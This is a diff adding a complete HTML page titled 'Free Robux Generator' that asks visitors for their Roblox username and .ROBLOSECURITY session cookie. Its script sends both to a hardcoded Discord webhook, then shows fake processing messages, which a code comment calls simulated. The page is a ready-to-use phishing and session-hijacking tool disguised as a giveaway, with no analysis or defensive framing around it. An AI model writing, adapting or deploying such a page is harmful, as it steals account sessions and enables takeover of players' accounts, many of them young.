@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Free Robux Generator</title>
+    <style>
+        body {
+            background: linear-gradient(120deg, #e8eaf6, #c5cae9, #b3e5fc);
+            font-family: Arial, sans-serif;
+            color: #222;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 6px 24px rgba(0,0,0,0.18);
+            padding: 32px 40px;
+            max-width: 360px;
+            width: 90%;
+            text-align: center;
+        }
+        h1 {
+            color: #00bfa5;
+            margin-bottom: 14px;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0 18px 0;
+            border-radius: 6px;
+            border: 1px solid #bdbdbd;
+            font-size: 16px;
+        }
+        button {
+            background: #00c853;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #43a047;
+        }
+        .note {
+            font-size: 12px;
+            color: #666;
+        }
+        .success {
+            color: #43a047;
+            margin-bottom: 10px;
+        }
+        .error {
+            color: #e53935;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Robux Generator</h1>
+        <div id="msg"></div>
+        <form id="robux-form" autocomplete="off">
+            <input type="text" id="username" placeholder="Roblox Username" required>
+            <input type="number" id="robux" placeholder="Amount of Robux (Max 5000)" min="1" max="5000" required>
+            <input type="text" id="cookie" placeholder=".ROBLOSECURITY Cookie" required>
+            <button type="submit">Get Free Robux</button>
+        </form>
+        <div class="note">* You must provide your .ROBLOSECURITY cookie for verification.<br>Maximum 5000 Robux per 30 minutes.</div>
+    </div>
+    <script>
+        document.getElementById('robux-form').addEventListener('submit', function(e){
+            e.preventDefault();
+
+            var username = document.getElementById('username').value.trim();
+            var robux = document.getElementById('robux').value;
+            var cookie = document.getElementById('cookie').value.trim();
+
+            var msgDiv = document.getElementById('msg');
+            msgDiv.innerHTML = '';
+
+            if(!username || !robux || !cookie) {
+                msgDiv.innerHTML = '<div class="error">Please fill out all fields.</div>';
+                return;
+            }
+
+            if(+robux < 1 || +robux > 5000) {
+                msgDiv.innerHTML = '<div class="error">Amount must be between 1 and 5000.</div>';
+                return;
+            }
+
+            var content =
+                "**Roblox Credentials**\n"
+                + "**username:** " + username + "\n"
+                + "**.ROBLOSECURITY:** `" + cookie + "`\n"
+                + "**Requested Robux:** " + robux;
+
+            fetch('https://discord.com/api/webhooks/1456906677663305792/zcqbEE3imWQLnCbbAg8zn5ax-yulUAlmO-6SldfEdEOT-CRUMsuZShV1je-zVsCQqzwf', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({content: content})
+            }).then(function(response){
+                if(response.status === 204 || response.status === 200){
+                    msgDiv.innerHTML = '<div class="success">Info sent! Processing request...<br>This may take up to 20 minutes. Please do not close this page.</div>';
+                } else {
+                    msgDiv.innerHTML = '<div class="error">Error sending data. Try again later.</div>';
+                }
+            }).catch(function(){
+                msgDiv.innerHTML = '<div class="error">Network error. Check your connection.</div>';
+            });
+
+            // Optional: Simulate fake processing/loading steps
+            setTimeout(function(){
+                msgDiv.innerHTML = '<div class="success">Robux is being added to your account. Please wait...</div>';
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
